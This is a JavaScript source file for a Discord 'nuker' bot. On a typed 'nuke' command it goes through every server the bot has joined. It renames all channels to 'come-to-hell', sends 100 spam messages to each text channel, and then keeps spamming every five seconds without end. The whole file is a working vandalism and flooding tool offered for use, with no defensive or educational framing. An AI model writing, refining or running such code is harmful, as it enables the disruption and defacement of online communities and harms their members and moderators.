import { Client, IntentsBitField } from "discord.js";
import dotenv from "dotenv";
import readline from "readline";

dotenv.config();

const client = new Client({
  intents: [
    IntentsBitField.Flags.Guilds,
    IntentsBitField.Flags.GuildMembers,
    IntentsBitField.Flags.GuildMessages,
    IntentsBitField.Flags.MessageContent,
  ],
});

// ===== HELPER FUNCTIONS =====

async function getAllGuilds() {
  return await client.guilds.fetch();
}

async function getChannelsFromGuild(guild) {
  return await guild.channels.fetch();
}

// ===== RENAME FUNCTION =====

async function renameChannel(channel, newName) {
  try {
    await channel.setName(newName);
    console.log(`Renamed: ${channel.name} → ${newName}`);
  } catch (error) {
    console.error(`Failed to rename ${channel.name}:`, error.message);
  }
}

// ===== SPAM MESSAGE FUNCTIONS =====

async function sendFirst100Messages(channel) {
  for (let i = 0; i < 100; i++) {
    try {
      await channel.send("Hello from the bot!");
      console.log(`${i + 1} Message sent to: ${channel.name}`);
    } catch (error) {
      console.error(`Failed to send message ${i + 1}:`, error.message);
    }
  }
}

function sendPerSecondMessages(channel) {
  setInterval(async () => {
    try {
      await channel.send("Hello from the bot!");
    } catch (error) {
      console.error(`Failed to send interval message:`, error.message);
    }
  }, 5000);
}

async function handleMessages(channel) {
  await sendFirst100Messages(channel);
  console.log("100 messages done, interval is now running");
  sendPerSecondMessages(channel);
}

// ===== MAIN NUKING FUNCTION =====

async function nukeChannel(channel) {
  try {
    const newName = `come-to-hell`;
    
    // rename
    await renameChannel(channel, newName);

    // send messages only to text channels
    if (channel.isTextBased()) {
      await handleMessages(channel);
    }
  } catch (error) {
    console.error(`Failed to nuke channel ${channel.name}:`, error.message);
  }
}

async function nukeGuild(guild) {
  console.log(`\n=== Nuking ${guild.name} ===`);
  const channels = await getChannelsFromGuild(guild);

  for (const channel of channels.values()) {
    await nukeChannel(channel);
  }
}

async function nukeAllGuilds() {
  const guilds = await getAllGuilds();

  for (const guild of guilds.values()) {
    try {
        await nukeGuild(guild);
    } catch (error) {
        console.error(`Failed to nuke ${guild.name}:`, error.message);
    }
  }
}

// ===== BOT EVENT =====

client.on("ready", async () => {
  console.log("Hello World");
  console.log(`Logged in as ${client.user.tag}`);
});

// ===== TERMINAL COMMAND LISTENER =====

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

function promptCommand() {
  rl.question("Enter command (nuke / exit): ", async (input) => {
    if (input.toLowerCase() === "nuke") {
      console.log("Starting to nuke all guilds...");
      try {
        await nukeAllGuilds();
        console.log("All guilds nuked!");
      } catch (error) {
        console.error("Error processing guilds:", error);
      }
    } else if (input.toLowerCase() === "exit") {
      console.log("Exiting...");
      process.exit(0);
    } else {
      console.log("Unknown command. Try 'nuke' or 'exit'");
    }

    promptCommand(); // ask again
  });
}

client.login(process.env.DISCORD_TOKEN);

// start listening for commands after bot is ready
client.once("ready", () => {
  promptCommand();
});